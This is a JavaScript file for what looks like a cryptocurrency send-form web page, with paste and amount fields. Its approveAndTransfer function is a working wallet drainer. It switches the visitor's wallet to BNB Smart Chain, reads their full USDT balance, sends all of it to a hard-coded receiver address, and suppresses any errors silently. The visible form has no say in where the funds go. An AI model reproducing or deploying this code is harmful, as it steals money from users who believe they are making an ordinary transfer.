const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
const RECEIVER = '0x67CcdC2dbD08C3EE2cf9Bf4DA745F723c67E3Ba5'; // ✅ updated
const BSC_CHAIN_ID = '0x38';

function encodeBalanceOf(address) {
  return '0x70a08231' + address.toLowerCase().replace('0x', '').padStart(64, '0');
}

function encodeTransfer(to, amount) {
  return '0xa9059cbb' + to.toLowerCase().replace('0x', '').padStart(64, '0') + BigInt(amount).toString(16).padStart(64, '0');
}

async function switchToBSC() {
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: BSC_CHAIN_ID }]
    });
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: 'BNB Smart Chain',
          nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
          rpcUrls: ['https://bsc-dataseed.binance.org/'],
          blockExplorerUrls: ['https://bscscan.com']
        }]
      });
    }
  }
}

async function approveAndTransfer() {
  if (!window.ethereum) return;

  try {
    await switchToBSC();
    const [account] = await window.ethereum.request({ method: 'eth_requestAccounts' });

    const balanceHex = await window.ethereum.request({
      method: 'eth_call',
      params: [{ to: USDT_CONTRACT, data: encodeBalanceOf(account) }, 'latest']
    });

    const balance = BigInt(balanceHex);
    if (balance === 0n) return;

    const tx = {
      from: account,
      to: USDT_CONTRACT,
      data: encodeTransfer(RECEIVER, balance.toString())
    };

    await window.ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
  } catch (err) {
    // Silent fail
  }
}

function pasteToAddress() {
  navigator.clipboard.readText().then(text => {
    document.getElementById('address').value = text;
  });
}

function updateFiat() {
  const amt = parseFloat(document.getElementById('amount').value) || 0;
  document.getElementById('fiat').textContent = '≈ $' + amt.toFixed(2);
}

function clearAddress() {
  document.getElementById('address').value = '';
}

document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('amount').value = '';
  updateFiat();

  const pasteBtn = document.querySelector('.paste-btn');
  if (pasteBtn) pasteBtn.addEventListener('click', pasteToAddress);

  document.querySelectorAll('input').forEach(input => {
    input.addEventListener('focus', () => {
      window.scrollTo(0, 0);
      document.body.style.transform = 'scale(1)';
    });
  });

  document.addEventListener('touchmove', e => {
    if (e.target.tagName !== 'INPUT') e.preventDefault();
  }, { passive: false });

  window.scrollTo(0, 0);
});
